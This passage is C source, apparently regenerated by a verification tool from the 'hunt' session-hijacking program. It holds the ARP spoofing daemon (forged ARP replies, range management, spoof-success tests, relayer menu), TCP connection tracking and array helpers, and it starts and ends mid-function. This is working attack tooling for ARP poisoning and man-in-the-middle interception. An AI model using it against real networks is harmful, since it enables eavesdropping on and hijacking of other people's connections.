              list_enqueue(&l_arp_spoof_range, (void *)asr);
          }

        }

      }

    }

  }


__CPROVER_DUMP_L10:
  ;
}

// arp_spoof_range_del
// file arpspoof.c line 1093
static void arp_spoof_range_del(void)
{
  signed int i;
  struct arp_spoof_range *asr;
  arp_spoof_range_list();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_arp_spoof_range);
  i=menu_choose_unr("item nr. to delete", 0, return_value_list_count_1 - 1, -1);
  if(i >= 0)
  {
    void *return_value_list_at_2;
    return_value_list_at_2=list_at(&l_arp_spoof_range, i);
    asr = (struct arp_spoof_range *)return_value_list_at_2;
    stop_arp_spoof_range(asr);
    list_remove(&l_arp_spoof_range, (void *)asr);
    free((void *)asr);
  }

}

// arp_spoof_range_list
// file arpspoof.c line 942
static signed int arp_spoof_range_list(void)
{
  struct list_iterator li;
  struct arp_spoof_range *asr;
  char buf[512l];
  signed int i = 0;
  list_iter_set(&li, &l_arp_spoof_range);
  void *return_value_list_iter_get_1;
  signed int tmp_post_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    asr = (struct arp_spoof_range *)return_value_list_iter_get_1;
    if(asr == ((struct arp_spoof_range *)NULL))
      break;

    sprintf_eth_mac(buf, (unsigned char *)asr->src_fake_mac);
    tmp_post_2 = i;
    i = i + 1;
    char *return_value_host_lookup_3;
    return_value_host_lookup_3=host_lookup(asr->dst_start_addr, 0);
    char *return_value_host_lookup_4;
    return_value_host_lookup_4=host_lookup(asr->dst_end_addr, 0);
    char *return_value_host_lookup_5;
    return_value_host_lookup_5=host_lookup(asr->src_addr, hl_mode);
    printf("%2d) on %s - %s is %-16s as %s refresh %ds\n", tmp_post_2, return_value_host_lookup_3, return_value_host_lookup_4, return_value_host_lookup_5, (const void *)buf, asr->refresh);
    if(i % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  list_iter_end(&li);
  return i;
}

// arp_spoof_range_user_test
// file arpspoof.c line 1244
static void arp_spoof_range_user_test(void)
{
  struct arp_spoof_range *asr;
  unsigned int dst_addr;
  signed int i;
  signed int range_test;
  arp_spoof_range_list();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_arp_spoof_range);
  i=menu_choose_unr("item nr. to test", 0, return_value_list_count_1 - 1, -1);
  _Bool tmp_if_expr_3;
  if(i >= 0)
  {
    void *return_value_list_at_2;
    return_value_list_at_2=list_at(&l_arp_spoof_range, i);
    asr = (struct arp_spoof_range *)return_value_list_at_2;
    range_test=menu_choose_yn("whole range test y/n", 0);
    if(range_test >= 0)
    {
      if(!(range_test == 0))
        dst_addr = (unsigned int)-1;

      else
      {
        dst_addr=menu_choose_hostname("host to test", (char *)(void *)0);
        if(dst_addr == 4294967295u)
          goto __CPROVER_DUMP_L12;

      }
      i = 0;
      for( ; !(i >= asr->asi_count); i = i + 1)
      {
        if(dst_addr == 4294967295u)
          tmp_if_expr_3 = asr->asi[(signed long int)i]->dst_mac_valid != 0 ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_3 = (_Bool)0;
        if(tmp_if_expr_3)
          do_test_or_refresh(asr->asi[(signed long int)i]);

        else
          if(asr->asi[(signed long int)i]->dst_addr == dst_addr)
          {
            do_test_or_refresh(asr->asi[(signed long int)i]);
            break;
          }

      }
      if(!(dst_addr == 4294967295u))
      {
        if(i >= asr->asi_count)
          printf("host not found in range database\n");

      }

    }

  }


__CPROVER_DUMP_L12:
  ;
}

// arp_spoof_switch_setup
// file options.c line 132
static void arp_spoof_switch_setup(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("switched environment", "yn", (char)(arp_spoof_switch != 0 ? 121 : 110));
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      arp_spoof_switch = 1;
      break;
    }
    case 110:
      arp_spoof_switch = 0;
  }
}

// arp_spoof_timejob
// file arpspoof.c line 129
signed int arp_spoof_timejob(void *arg, signed int arg_sec)
{
  struct arp_spoof_info *asi = (struct arp_spoof_info *)arg;
  struct mac_info *mi_dst;
  struct mac_info *mi_src;
  if(asi->dst_mac_valid == 0)
  {
    mi_dst=mac_info_get(asi->dst_addr);
    if(!(mi_dst == ((struct mac_info *)NULL)))
    {
      memcpy((void *)asi->dst_mac, (const void *)mi_dst->mac, (unsigned long int)6);
      asi->dst_mac_valid = 1;
      mac_info_release(mi_dst);
    }

    else
      mac_discover(asi->dst_addr, 1);
  }

  if(asi->src_mac_valid == 0)
  {
    mi_src=mac_info_get(asi->src_addr);
    if(!(mi_src == ((struct mac_info *)NULL)))
    {
      memcpy((void *)asi->src_mac, (const void *)mi_src->mac, (unsigned long int)6);
      asi->src_mac_valid = 1;
      mac_info_release(mi_src);
    }

    else
      mac_discover(asi->src_addr, 1);
  }

  if(!(asi->dst_mac_valid == 0))
  {
    send_src_spoof_to_dst(asi);
    unsigned int return_value___bswap_32_1;
    return_value___bswap_32_1=__bswap_32_link6(asi->dst_addr);
    unsigned int return_value___bswap_32_2;
    return_value___bswap_32_2=__bswap_32_link6(return_value___bswap_32_1 + (unsigned int)1);
    send_src_spoof_to_dst_through_request(asi, return_value___bswap_32_2);
  }

  return arg_sec;
}

// arp_spoof_user_test
// file arpspoof.c line 1231
static void arp_spoof_user_test(void)
{
  signed int i;
  struct arp_spoof_info *asi;
  arp_spoof_list_items();
  signed int return_value_arp_spoof_count_1;
  return_value_arp_spoof_count_1=arp_spoof_count();
  i=menu_choose_unr("item nr. to test", 0, return_value_arp_spoof_count_1 - 1, -1);
  if(i >= 0)
  {
    void *return_value_list_at_2;
    return_value_list_at_2=list_at(&l_arp_spoof, i);
    asi = (struct arp_spoof_info *)return_value_list_at_2;
    do_test_or_refresh(asi);
  }

}

// arp_spoof_with_my_mac_setup
// file options.c line 147
static void arp_spoof_with_my_mac_setup(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("use my mac in ARP spoofing", "yn", (char)(arp_spoof_with_my_mac != 0 ? 121 : 110));
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      arp_spoof_with_my_mac = 1;
      break;
    }
    case 110:
      arp_spoof_with_my_mac = 0;
  }
}

// arpspoof_exit_check
// file hunt.h line 533
signed int arpspoof_exit_check()
{
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_arp_spoof);
  if(return_value_list_count_1 >= 1)
  {
    set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
    printf("there are arp spoofed addresses left in arpspoof daemon\n");
    set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
  }

  return 0;
}

// arpspoof_menu
// file hunt.h line 526
void arpspoof_menu(void)
{
  char *r_menu = "s/k) start/stop relayer daemon\nl/L) list arp spoof database\na)   add host to host arp spoof     i/I) insert single/range arp spoof\nd)   delete host to host arp spoof  r/R) remove single/range arp spoof\nt/T) test if arp spoof successed    y) relay database\nx)   return\n";
  char *r_keys = "sklLadiIrRmtTyx";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    signed int return_value_menu_1;
    return_value_menu_1=menu("arpspoof daemon", r_menu, "arps", r_keys, (char)0);
    switch(return_value_menu_1)
    {
      case 115:
      {
        start_arp_relayer();
        break;
      }
      case 107:
      {
        stop_arp_relayer();
        break;
      }
      case 108:
      {
        arp_spoof_list_items();
        break;
      }
      case 76:
      {
        arp_spoof_range_list();
        break;
      }
      case 97:
      {
        arp_spoof_add_h();
        break;
      }
      case 100:
      {
        arp_spoof_del_h();
        break;
      }
      case 105:
      {
        arp_spoof_add_item();
        break;
      }
      case 73:
      {
        arp_spoof_range_add();
        break;
      }
      case 114:
      {
        arp_spoof_del_item();
        break;
      }
      case 82:
      {
        arp_spoof_range_del();
        break;
      }
      case 116:
      {
        arp_spoof_user_test();
        break;
      }
      case 84:
      {
        arp_spoof_range_user_test();
        break;
      }
      case 121:
      {
        relay_menu();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// arpspoof_test
// file arpspoof.c line 1372
signed int arpspoof_test(struct arp_spoof_info *asi)
{
  struct timeval tv;
  struct timespec timeout;
  struct ifunc_item ifunc_pingtest;
  struct packet *p;
  signed int retval;
  signed int i;
  void *return_value_list_consume_1;
  if(asi->dst_mac_valid == 0)
  {
    fprintf(stderr, "error: try to do arpspoof_test without known dst mac\n");
    return -1;
  }

  else
  {
    ifunc_pingtest.func = hunt_arpspoof_test;
    ifunc_pingtest.arg = (void *)asi;
    list_enqueue(&l_ifunc_icmp, (void *)&ifunc_pingtest);
    i = 0;
    retval = 0;
    for( ; retval == 0 && !(i >= 3); i = i + 1)
    {
      send_icmp_request(asi->src_addr, asi->dst_addr, (char *)asi->src_fake_mac, (char *)asi->dst_mac, (unsigned short int)(1 + i));
      gettimeofday(&tv, (struct timezone *)(void *)0);
      timeout.tv_sec = tv.tv_sec + (signed long int)1;
      timeout.tv_nsec = tv.tv_usec * (signed long int)1000;
      do
      {
        return_value_list_consume_1=list_consume(&l_arpspoof_test, &timeout);
        p = (struct packet *)return_value_list_consume_1;
        if(p == ((struct packet *)NULL))
          break;

        retval=is_icmp_reply(p, asi->dst_addr, asi->src_addr, (char *)asi->dst_mac, (char *)asi->src_fake_mac);
        packet_free(p);
        if(!(retval == 0))
          break;

      }
      while((_Bool)1);
    }
    list_remove(&l_ifunc_icmp, (void *)&ifunc_pingtest);
    packet_flush(&l_arpspoof_test);
    if(retval == 1)
      return 0;

    else
      if(retval == 2)
        return -1;

    return -1;
  }
}

// array_at
// file c/array.c line 64
void * array_at(struct array *a, signed int nr)
{
  void *retval;
  __lock_link2(a);
  _Bool tmp_if_expr_1;
  if(!(nr >= 0))
    tmp_if_expr_1 = (_Bool)1;

  else
    tmp_if_expr_1 = nr >= a->a_size ? (_Bool)1 : (_Bool)0;
  if(tmp_if_expr_1)
    retval = (void *)0;

  else
    retval = (a->a_arr + (signed long int)nr)->ai_data;
  __unlock_link2(a);
  return retval;
}

// array_count
// file c/array.c line 172
signed int array_count(struct array *a)
{
  signed int retval;
  __lock_link2(a);
  retval = a->a_items;
  __unlock_link2(a);
  return retval;
}

// array_free
// file c/array.c line 53
void array_free(struct array *a)
{
  __lock_link2(a);
  if(!(a->a_arr == ((struct array_item *)NULL)))
    free((void *)a->a_arr);

  a->a_arr = (struct array_item *)(void *)0;
  a->a_size = 0;
  a->a_items = 0;
  __unlock_link2(a);
}

// array_init
// file c/array.c line 25
void array_init(struct array *a, signed int size)
{
  void *return_value_malloc_1;
  return_value_malloc_1=malloc((unsigned long int)size * sizeof(struct array_item) /*8ul*/ );
  a->a_arr = (struct array_item *)return_value_malloc_1;
  /* assertion a->a_arr = malloc(size * sizeof(struct array_item)) */
  assert(a->a_arr != ((struct array_item *)NULL));
  memset((void *)a->a_arr, 0, (unsigned long int)size * sizeof(struct array_item) /*8ul*/ );
  a->a_size = size;
  a->a_items = 0;
  a->a_locked = 0;
  pthread_mutex_init(&a->a_mutex, (const union anonymous_9 *)(void *)0);
}

// array_iter_end
// file c/array.c line 236
void array_iter_end(struct array_iterator *ai)
{
  ai->i_array = (struct array *)(void *)0;
  ai->i_pos = -1;
}

// array_iter_get
// file c/array.c line 218
void * array_iter_get(struct array_iterator *ai)
{
  struct array *a;
  void *retval = (void *)0;
  a = ai->i_array;
  __lock_link2(a);
  do
  {
    ai->i_pos = ai->i_pos + 1;
    if(ai->i_pos >= a->a_size)
      break;

    if(!((a->a_arr + (signed long int)ai->i_pos)->ai_data == NULL))
    {
      retval = (a->a_arr + (signed long int)ai->i_pos)->ai_data;
      break;
    }

  }
  while((_Bool)1);
  __unlock_link2(a);
  return retval;
}

// array_iter_lock
// file c/array.c line 202
void array_iter_lock(struct array_iterator *ai)
{
  array_lock(ai->i_array);
}

// array_iter_set
// file c/array.c line 212
void array_iter_set(struct array_iterator *ai, struct array *a)
{
  ai->i_array = a;
  ai->i_pos = -1;
}

// array_iter_unlock
// file c/array.c line 207
void array_iter_unlock(struct array_iterator *ai)
{
  array_unlock(ai->i_array);
}

// array_lock
// file c/array.c line 182
void array_lock(struct array *a)
{
  _Bool tmp_if_expr_2;
  unsigned long int return_value_pthread_self_1;
  if(a->a_locked == 0)
    tmp_if_expr_2 = (_Bool)1;

  else
  {
    return_value_pthread_self_1=pthread_self();
    tmp_if_expr_2 = a->a_locked_thr != return_value_pthread_self_1 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2)
  {
    pthread_mutex_lock(&a->a_mutex);
    a->a_locked_thr=pthread_self();
    a->a_locked = 1;
  }

  else
    a->a_locked = a->a_locked + 1;
}

// array_pop
// file c/array.c line 154
void * array_pop(struct array *a)
{
  struct array_item *ai;
  void *retval = (void *)0;
  __lock_link2(a);
  ai = a->a_arr;
  for( ; !(ai >= a->a_arr + (signed long int)a->a_size); ai = ai + 1l)
    if(!(ai->ai_data == NULL))
    {
      retval = ai->ai_data;
      ai->ai_data = (void *)0;
      a->a_items = a->a_items - 1;
      break;
    }

  __unlock_link2(a);
  return retval;
}

// array_put
// file c/array.c line 135
signed int array_put(struct array *a, void *m)
{
  struct array_item *ai;
  signed int retval;
  __lock_link2(a);
  need_space(a);
  ai = a->a_arr;
  for( ; !(ai >= a->a_arr + (signed long int)a->a_size); ai = ai + 1l)
    if(ai->ai_data == NULL)
    {
      ai->ai_data = m;
      a->a_items = a->a_items + 1;
      break;
    }

  retval = (signed int)(ai - a->a_arr);
  __unlock_link2(a);
  return retval;
}

// array_put_at
// file c/array.c line 82
void * array_put_at(struct array *a, signed int nr, void *m)
{
  void *retval;
  __lock_link2(a);
  _Bool tmp_if_expr_1;
  if(!(nr >= 0))
    tmp_if_expr_1 = (_Bool)1;

  else
    tmp_if_expr_1 = nr >= a->a_size ? (_Bool)1 : (_Bool)0;
  if(tmp_if_expr_1)
    retval = (void *)0;

  else
  {
    update_a_items(a, nr, m);
    retval = (a->a_arr + (signed long int)nr)->ai_data;
    (a->a_arr + (signed long int)nr)->ai_data = m;
  }
  __unlock_link2(a);
  return retval;
}

// array_remove
// file c/array.c line 98
void * array_remove(struct array *a, void *m)
{
  struct array_item *ai;
  void *retval;
  __lock_link2(a);
  if(m == NULL)
    retval = (void *)0;

  else
  {
    retval = (void *)0;
    ai = a->a_arr;
    for( ; !(ai >= a->a_arr + (signed long int)a->a_size); ai = ai + 1l)
      if(ai->ai_data == m)
      {
        ai->ai_data = (void *)0;
        a->a_items = a->a_items - 1;
        retval = m;
        break;
      }

  }
  __unlock_link2(a);
  return retval;
}

// array_remove_at
// file c/array.c line 77
void * array_remove_at(struct array *a, signed int nr)
{
  void *return_value_array_put_at_1;
  return_value_array_put_at_1=array_put_at(a, nr, (void *)0);
  return return_value_array_put_at_1;
}

// array_unlock
// file c/array.c line 194
void array_unlock(struct array *a)
{
  a->a_locked = a->a_locked - 1;
  if(a->a_locked == 0)
    pthread_mutex_unlock(&a->a_mutex);

}

// asi_release
// file arpspoof.c line 380
static void asi_release(struct arp_spoof_info *asi)
{
  pthread_mutex_lock(&asi->mutex);
  asi->lock_count = asi->lock_count - 1;
  if(asi->lock_count == 0)
    pthread_cond_broadcast(&asi->lock_cond);

  pthread_mutex_unlock(&asi->mutex);
}

// asi_wait_for_release
// file arpspoof.c line 388
static void asi_wait_for_release(struct arp_spoof_info *asi)
{
  pthread_mutex_lock(&asi->mutex);
  while(asi->lock_count >= 1)
    pthread_cond_wait(&asi->lock_cond, &asi->mutex);
  pthread_mutex_unlock(&asi->mutex);
}

// asi_want
// file arpspoof.c line 373
static void asi_want(struct arp_spoof_info *asi)
{
  pthread_mutex_lock(&asi->mutex);
  asi->lock_count = asi->lock_count + 1;
  pthread_mutex_unlock(&asi->mutex);
}

// check_dont_relay
// file arpspoof.c line 633
static signed int check_dont_relay(struct packet *p)
{
  struct arp_dont_relay *adr;
  struct list_iterator li;
  struct iphdr *iph;
  struct tcphdr *tcph;
  signed int check_dont_relay__1__dont_relay;
  iph = p->p_iph;
  tcph = p->p_hdr.p_tcph;
  check_dont_relay__1__dont_relay = 0;
  list_lock(&l_arp_dont_relay);
  list_iter_set(&li, &l_arp_dont_relay);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    adr = (struct arp_dont_relay *)return_value_list_iter_get_1;
    if(adr == ((struct arp_dont_relay *)NULL))
      break;

    if(adr->src_addr == iph->saddr)
    {
      if(adr->dst_addr == iph->daddr)
      {
        if(adr->src_port == tcph->_anon0._anon1.source)
        {
          if(adr->dst_port == tcph->_anon0._anon1.dest)
          {
            check_dont_relay__1__dont_relay = 1;
            break;
          }

        }

      }

    }

    if(adr->src_addr == iph->daddr)
    {
      if(adr->dst_addr == iph->saddr)
      {
        if(adr->src_port == tcph->_anon0._anon1.dest)
        {
          if(adr->dst_port == tcph->_anon0._anon1.source)
          {
            check_dont_relay__1__dont_relay = 1;
            break;
          }

        }

      }

    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  list_unlock(&l_arp_dont_relay);
  return check_dont_relay__1__dont_relay;
}

// check_interval
// file resolv.c line 109
static void check_interval(signed int __time)
{
  struct hash_iterator li;
  struct resolv_item *r;
  unsigned int ip;
  hash_lock(&ip_to_name_table);
  hash_iter_set(&li, &ip_to_name_table);
  void *return_value_hash_iter_get_1;
  do
  {
    return_value_hash_iter_get_1=hash_iter_get(&li, &ip);
    r = (struct resolv_item *)return_value_hash_iter_get_1;
    if(r == ((struct resolv_item *)NULL))
      break;

    if(!(1200l + r->put_timestamp >= (signed long int)__time))
      resolv_remove(ip);

    else
      if(r->get_timestamp + -r->put_timestamp >= 600l)
        resolv_request(ip);

  }
  while((_Bool)1);
  hash_iter_end(&li);
  hash_unlock(&ip_to_name_table);
}

// choose_connection
// file main.c line 54
signed int choose_connection(struct user_conn_info *uci)
{
  struct user_conn_info *arr_uci;
  char *str;
  signed int count;
  signed int i;
  signed int retval = -1;
  count=conn_list(&arr_uci, &str, 0, 0);
  if(!(arr_uci == ((struct user_conn_info *)NULL)))
  {
    printf("%s\n", str);
    free((void *)str);
    i=menu_choose_unr("choose conn", 0, count - 1, -1);
    if(i >= 0)
    {
      memcpy((void *)uci, (const void *)&arr_uci[(signed long int)i], sizeof(struct user_conn_info) /*24ul*/ );
      retval = 0;
    }

    free((void *)arr_uci);
  }

  else
    printf("no connections are available\n");
  return retval;
}

// choose_daemon
// file main.c line 378
static void choose_daemon(void)
{
  char *daemon_menu = "r) reset daemon\na) arp spoof + arp relayer daemon\ns) sniff daemon\nm) mac discovery daemon\nx) return\n";
  char *daemon_chars = "rasmx";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    signed int return_value_menu_1;
    return_value_menu_1=menu("daemons", daemon_menu, "dm", daemon_chars, (char)0);
    switch(return_value_menu_1)
    {
      case 114:
      {
        rstd_menu();
        break;
      }
      case 97:
      {
        arpspoof_menu();
        break;
      }
      case 115:
      {
        sniff_menu();
        break;
      }
      case 109:
      {
        mac_disc_menu();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// cleanup_slaves
// file resolv.c line 312
static void cleanup_slaves(struct list *slaves)
{
  struct list_iterator li;
  struct slave *sl;
  list_iter_set(&li, slaves);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    sl = (struct slave *)return_value_list_iter_get_1;
    if(sl == ((struct slave *)NULL))
      break;

    kill(sl->s_pid, 15);
  }
  while((_Bool)1);
  list_iter_end(&li);
  list_iter_set(&li, slaves);
  void *return_value_list_iter_get_2;
  do
  {
    return_value_list_iter_get_2=list_iter_get(&li);
    sl = (struct slave *)return_value_list_iter_get_2;
    if(sl == ((struct slave *)NULL))
      break;

    waitpid(sl->s_pid, (signed int *)(void *)0, 0);
  }
  while((_Bool)1);
  list_iter_end(&li);
  void *return_value_list_pop_3;
  do
  {
    return_value_list_pop_3=list_pop(slaves);
    sl = (struct slave *)return_value_list_pop_3;
    if(sl == ((struct slave *)NULL))
      break;

    free((void *)sl);
  }
  while((_Bool)1);
}

// clear_new_conn_ind
// file hunt.h line 374
void clear_new_conn_ind(void)
{
  pthread_mutex_lock(&menucc_mutex);
  menucc_conn_s_old = menucc_conn_s;
  pthread_mutex_unlock(&menucc_mutex);
}

// clear_scr
// file hunt.h line 433
void clear_scr(void)
{
  signed int i = 0;
  for( ; !(i >= 50); i = i + 1)
    putchar(10);
}

// conn_add
// file hunt.c line 514
static void conn_add(struct packet *p)
{
  struct conn_info *ci;
  struct user_conn_info uci;
  unsigned int key;
  fill_uci(&uci, p);
  key=uci_generate_key(&uci);
  hash_lock(&conn_table);
  void *return_value_hash_get_1;
  return_value_hash_get_1=hash_get(&conn_table, key, (void *)&uci);
  ci = (struct conn_info *)return_value_hash_get_1;
  _Bool tmp_if_expr_3;
  signed int return_value_ht_eq_2;
  if(!(ci == ((struct conn_info *)NULL)))
  {
    return_value_ht_eq_2=ht_eq(key, ci, &uci);
    tmp_if_expr_3 = return_value_ht_eq_2 == 1 ? (_Bool)1 : (_Bool)0;
  }

  else
    tmp_if_expr_3 = (_Bool)0;
  if(tmp_if_expr_3)
    conn_add_update(p);

  else
    __conn_add(p, key);
  hash_unlock(&conn_table);
}

// conn_add_match
// file hunt.h line 593
signed int conn_add_match(unsigned int src_addr, unsigned int dst_addr, unsigned short int src_port, unsigned short int dst_port)
{
  struct list_iterator li;
  struct add_policy_info *api;
  signed int retval = 0;
  list_lock(&l_add_policy);
  list_iter_set(&li, &l_add_policy);
  void *return_value_list_iter_get_1;
  signed int return_value_port_match_3;
  signed int return_value_port_match_2;
  signed int return_value_port_match_5;
  signed int return_value_port_match_4;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    api = (struct add_policy_info *)return_value_list_iter_get_1;
    if(api == ((struct add_policy_info *)NULL))
      break;

    if((api->src_mask & src_addr) == api->src_addr)
    {
      if((api->dst_mask & dst_addr) == api->dst_addr)
      {
        return_value_port_match_3=port_match((signed int)src_port, api->src_ports);
        if(!(return_value_port_match_3 == 0))
        {
          return_value_port_match_2=port_match((signed int)dst_port, api->dst_ports);
          if(!(return_value_port_match_2 == 0))
          {
            retval = 1;
            break;
          }

        }

      }

    }

    if((api->src_mask & src_addr) == api->dst_addr)
    {
      if((api->dst_mask & dst_addr) == api->src_addr)
      {
        return_value_port_match_5=port_match((signed int)src_port, api->dst_ports);
        if(!(return_value_port_match_5 == 0))
        {
          return_value_port_match_4=port_match((signed int)dst_port, api->src_ports);
          if(!(return_value_port_match_4 == 0))
          {
            retval = 1;
            break;
          }

        }

      }

    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  list_unlock(&l_add_policy);
  return retval;
}

// conn_add_policy
// file hunt.h line 595
signed int conn_add_policy(struct iphdr *iph, struct tcphdr *tcph)
{
  signed int return_value_conn_add_match_1;
  return_value_conn_add_match_1=conn_add_match(iph->saddr, iph->daddr, tcph->_anon0._anon1.source, tcph->_anon0._anon1.dest);
  return return_value_conn_add_match_1;
}

// conn_add_update
// file hunt.c line 377
static void conn_add_update(struct packet *p)
{
  unsigned int key;
  struct conn_info *ci;
  struct user_conn_info uci;
  unsigned int old_next_d_seq;
  fill_uci(&uci, p);
  key=uci_generate_key(&uci);
  hash_lock(&conn_table);
  void *return_value_hash_get_19;
  return_value_hash_get_19=hash_get(&conn_table, key, (void *)&uci);
  ci = (struct conn_info *)return_value_hash_get_19;
  _Bool tmp_if_expr_21;
  signed int return_value_ht_eq_20;
  if(!(ci == ((struct conn_info *)NULL)))
  {
    return_value_ht_eq_20=ht_eq(key, ci, &uci);
    tmp_if_expr_21 = return_value_ht_eq_20 == 1 ? (_Bool)1 : (_Bool)0;
  }

  else
    tmp_if_expr_21 = (_Bool)0;
  _Bool tmp_if_expr_1;
  _Bool tmp_if_expr_2;
  _Bool tmp_if_expr_3;
  _Bool tmp_if_expr_8;
  _Bool tmp_if_expr_12;
  _Bool tmp_if_expr_13;
  _Bool tmp_if_expr_14;
  _Bool tmp_if_expr_18;
  _Bool tmp_if_expr_15;
  _Bool tmp_if_expr_16;
  _Bool tmp_if_expr_17;
  if(tmp_if_expr_21)
  {
    signed int return_value_conn_skip_update_9;
    return_value_conn_skip_update_9=conn_skip_update(ci, p);
    if(return_value_conn_skip_update_9 == 0)
    {
      struct host_info *h_src;
      struct host_info *h_dst;
      struct iphdr *iph = p->p_iph;
      struct tcphdr *tcph = p->p_hdr.p_tcph;
      if(ci->src_addr == (unsigned long int)iph->saddr)
        tmp_if_expr_1 = ci->dst_addr == (unsigned long int)iph->daddr ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_1 = (_Bool)0;
      if(tmp_if_expr_1)
        tmp_if_expr_2 = ci->src_port == tcph->_anon0._anon1.source ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_2 = (_Bool)0;
      if(tmp_if_expr_2)
        tmp_if_expr_3 = ci->dst_port == tcph->_anon0._anon1.dest ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_3 = (_Bool)0;
      if(tmp_if_expr_3)
      {
        h_src = &ci->src;
        h_dst = &ci->dst;
      }

      else
      {
        h_src = &ci->dst;
        h_dst = &ci->src;
      }
      old_next_d_seq = (unsigned int)h_src->next_d_seq;
      unsigned int return_value___bswap_32_4;
      return_value___bswap_32_4=__bswap_32(tcph->_anon0._anon1.seq);
      unsigned int return_value___bswap_32_5;
      return_value___bswap_32_5=__bswap_32(return_value___bswap_32_4 + (unsigned int)p->p_data_len);
      h_src->next_seq = (unsigned long int)return_value___bswap_32_5;
      if(!(tcph->_anon0._anon1.ack == 0))
        h_src->next_d_seq = (unsigned long int)tcph->_anon0._anon1.ack_seq;

      h_src->id = iph->id;
      h_src->window = tcph->_anon0._anon1.window;
      memcpy((void *)h_src->dst_mac, (const void *)p->p_ethh->h_dest, (unsigned long int)6);
      memcpy((void *)h_src->src_mac, (const void *)p->p_ethh->h_source, (unsigned long int)6);
      unsigned int return_value___bswap_32_6;
      return_value___bswap_32_6=__bswap_32((unsigned int)h_src->next_d_seq);
      unsigned int return_value___bswap_32_7;
      return_value___bswap_32_7=__bswap_32(old_next_d_seq);
      h_src->delta_d_seq = h_src->delta_d_seq + (return_value___bswap_32_6 - return_value___bswap_32_7);
      ci->update_count = ci->update_count + 1u;
      if(ci->update_count % 400u == 0u)
      {
        if(ci->src.delta_d_seq == 0u)
          tmp_if_expr_8 = ci->dst.delta_d_seq == (unsigned int)0 ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_8 = (_Bool)0;
        if(tmp_if_expr_8)
          ack_storm_notify(ci, &uci);

        else
        {
          ci->src.delta_d_seq = (unsigned int)0;
          ci->dst.delta_d_seq = (unsigned int)0;
        }
      }

    }

  }

  else
    if(p->p_data_len >= 1)
    {
      signed int return_value_conn_add_policy_10;
      return_value_conn_add_policy_10=conn_add_policy(p->p_iph, p->p_hdr.p_tcph);
      if(!(return_value_conn_add_policy_10 == 0))
        __conn_add(p, key);

    }

    else
    {
      static struct user_conn_info last_toadd = { .src_addr=(unsigned long int)0, .dst_addr=(unsigned long int)0, .src_port=(unsigned short int)0,
    .dst_port=(unsigned short int)0 };
      if(last_toadd.src_addr == (unsigned long int)p->p_iph->saddr)
        tmp_if_expr_12 = last_toadd.dst_addr == (unsigned long int)p->p_iph->daddr ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_12 = (_Bool)0;
      if(tmp_if_expr_12)
        tmp_if_expr_13 = last_toadd.src_port == p->p_hdr.p_tcph->_anon0._anon1.source ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_13 = (_Bool)0;
      if(tmp_if_expr_13)
        tmp_if_expr_14 = last_toadd.dst_port == p->p_hdr.p_tcph->_anon0._anon1.dest ? (_Bool)1 : (_Bool)0;

      else
        tmp_if_expr_14 = (_Bool)0;
      if(tmp_if_expr_14)
        tmp_if_expr_18 = (_Bool)1;

      else
      {
        if(last_toadd.src_addr == (unsigned long int)p->p_iph->daddr)
          tmp_if_expr_15 = last_toadd.dst_addr == (unsigned long int)p->p_iph->saddr ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_15 = (_Bool)0;
        if(tmp_if_expr_15)
          tmp_if_expr_16 = last_toadd.src_port == p->p_hdr.p_tcph->_anon0._anon1.dest ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_16 = (_Bool)0;
        if(tmp_if_expr_16)
          tmp_if_expr_17 = last_toadd.dst_port == p->p_hdr.p_tcph->_anon0._anon1.source ? (_Bool)1 : (_Bool)0;

        else
          tmp_if_expr_17 = (_Bool)0;
        tmp_if_expr_18 = tmp_if_expr_17 ? (_Bool)1 : (_Bool)0;
      }
      static signed int last_count = 0;
      if(tmp_if_expr_18)
      {
        last_count = last_count + 1;
        if(last_count >= 10)
        {
          last_count = 0;
          signed int return_value_conn_add_policy_11;
          return_value_conn_add_policy_11=conn_add_policy(p->p_iph, p->p_hdr.p_tcph);
          if(!(return_value_conn_add_policy_11 == 0))
            __conn_add(p, key);

        }

      }

      else
      {
        last_count = 0;
        last_toadd.src_addr = (unsigned long int)p->p_iph->saddr;
        last_toadd.dst_addr = (unsigned long int)p->p_iph->daddr;
        last_toadd.src_port = p->p_hdr.p_tcph->_anon0._anon1.source;
        last_toadd.dst_port = p->p_hdr.p_tcph->_anon0._anon1.dest;
      }
    }
  hash_unlock(&conn_table);
}

// conn_del
// file hunt.c line 471
static void conn_del(struct packet *p)
{
  struct conn_info *ci;
  struct user_conn_info uci;
  unsigned int key;
  signed int remove_it = 0;
  fill_uci(&uci, p);
  key=uci_generate_key(&uci);
  hash_lock(&conn_table);
  void *return_value_hash_get_6;
  return_value_hash_get_6=hash_get(&conn_table, key, (void *)&uci);
  ci = (struct conn_info *)return_value_hash_get_6;
